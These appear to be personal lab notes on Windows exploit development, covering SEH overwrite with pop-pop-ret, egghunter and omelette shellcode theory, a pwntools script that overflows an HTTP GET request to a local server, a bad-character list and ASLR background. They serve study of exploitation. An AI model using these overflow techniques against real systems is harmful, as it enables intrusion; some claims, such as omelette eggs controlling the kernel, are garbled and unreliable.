* Basicly, goal of SEH exploitation is to find offset + the PPR (pop-pop-ret) instruction address. Then to create a junk that is composed of (offset - 4 bytes) - where we will jump\_front...thats why we added a padding for that so that jmp\_front has 4 bytes. Them we make some junk also while jumping back...we create 400 bytes junk and jump rather 600 bytes back, that could be enough...Finally we also add nop instruction
* Warning - firewall will try to prohibit it maaany times (because it works :tada: )

THEORY - ERC xDBG

[https://github.com/Andy53/ERC.Xdbg?tab=readme-ov-file](https://github.com/Andy53/ERC.Xdbg?tab=readme-ov-file)

## 08 - EGGHUNTER&#x20;

THEORY

* OMLETTE
  * variation on egghunter shellcode
  * sometimes we dont have space enough in buffer to pass all the args for our shellcode...
    * omlette allows us to split into more smaller args, they bypass through kernel auth and then they compose into one big egg that can control kernel...
  * “Eggs” also plays an important role when it comes to complex exploit development. As we know, in stack-based buffer overflow, the memory is more or less static. That is, we have enough memory to insert our shellcode.&#x20;
    * When the “Egg hunter” shellcode is executed, it searches for the unique “tag” that was prefixed with the large payload and starts the execution of the payload.&#x20;
    * The next question that comes to our mind is “Why do we need Egg hunter codes for stack-based buffer overflows?”&#x20;
      * The Egg hunting technique is used when there are not enough available consecutive memory locations to insert the shellcode. Instead, a unique “tag” is prefixed with shellcode.

<figure><img src=".gitbook/assets/image (25).png" alt=""><figcaption><p>Stack based Buffer Overflow Exploit...</p></figcaption></figure>

### S1: Offset

* work only in windows machine (we dont need linux now)
* basic exploit code for running on localhost:

```python
from pwn import *

io = remote("localhost", 80)

offset = 260
http_Method = b"GET /"
input_Buffer = b"A" * offset
http_EndRequest = b"\r\n\r\n"

buffer = http_Method + input_Buffer + http_EndRequest

io.sendline(buffer)
io.interactive()
```

* we can see that the offset ends 7 As nefore ending of our generated pattern of As...
  * 253 is the offset

### S2: Find all the badchars

* answer:&#x20;
  * \x00\x0a\x0d\x25

### S3: Base address of only module without ASLR

Theory about ASLR:

Address space layout randomization (ASLR) is a memory-protection process for operating systems (OSes) that guards against buffer-overflow attacks by randomizing the location where system executables are loaded into memory.

The success of many cyberattacks, particularly zero-day exploits, relies on the hacker's ability to know or guess the position of processes and functions in memory. ASLR is able to put address space targets in unpredictable locations. If an attacker attempts to exploit an incorrect address space location, the target application will crash, stopping the attack and alerting the system. &#x20;

ASLR was created by the Pax Project as a Linux [patch](https://www.techtarget.com/searchenterprisedesktop/definition/patch) in 2001 and was integrated into the Windows operating system beginning with Vista in 2007. Prior to ASLR, the memory locations of files and applications were either known or easily determined.&#x20;



